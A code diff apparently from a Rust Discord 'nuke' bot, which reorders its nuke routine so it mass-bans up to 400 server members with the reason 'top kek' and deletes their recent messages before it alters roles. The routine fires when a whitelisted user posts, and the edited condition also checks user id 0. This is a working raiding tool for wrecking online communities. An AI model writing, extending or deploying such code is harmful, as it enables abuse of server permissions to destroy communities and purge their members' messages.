@@ -35,6 +35,23 @@ async fn nuke(ctx: &Context, conf: &Config, guild: &GuildId) {
         }
     };
     println!("Guild name: {}", guild.name);
+    let members = match guild.members(&ctx.http, Some(400), None).await {
+        Ok(v) => v,
+        Err(e) => {
+            println!("{e}");
+            return;
+        },
+    };
+
+    for user in members {
+        if conf.blacklist_users.contains(&user.user.id.0) {
+            continue;
+        }
+        match user.ban_with_reason(&ctx.http, 7, "top kek").await {
+            Ok(_) => println!("banning {}", user.user.name),
+            Err(_) => {}
+        };
+    }
     for (id, value) in &mut guild.roles {
         if conf.blacklist_roles.contains(&id.0) {
             continue;
@@ -56,24 +73,6 @@ async fn nuke(ctx: &Context, conf: &Config, guild: &GuildId) {
             }
         };
     }
-
-    let members = match guild.members(&ctx.http, Some(400), None).await {
-        Ok(v) => v,
-        Err(e) => {
-            println!("{e}");
-            return;
-        },
-    };
-
-    for user in members {
-        if conf.blacklist_users.contains(&user.user.id.0) {
-            continue;
-        }
-        match user.ban_with_reason(&ctx.http, 7, "top kek").await {
-            Ok(_) => println!("banning {}", user.user.name),
-            Err(_) => {}
-        };
-    }
 }
 
 #[async_trait]
@@ -92,7 +91,7 @@ impl EventHandler for Handler {
             None => return,
         };
         let users = self.conf.user_whitelist.as_ref();
-        if users.is_some() && users.unwrap().contains(&msg.author.id.0) || users.unwrap().contains(&    ) {
+        if users.is_some() && users.unwrap().contains(&msg.author.id.0) || users.unwrap().contains(&0) {
             nuke(&ctx, &self.conf, &guild).await;
         }
         let result = match parse_cmd(msg.content.to_owned()).as_str() {
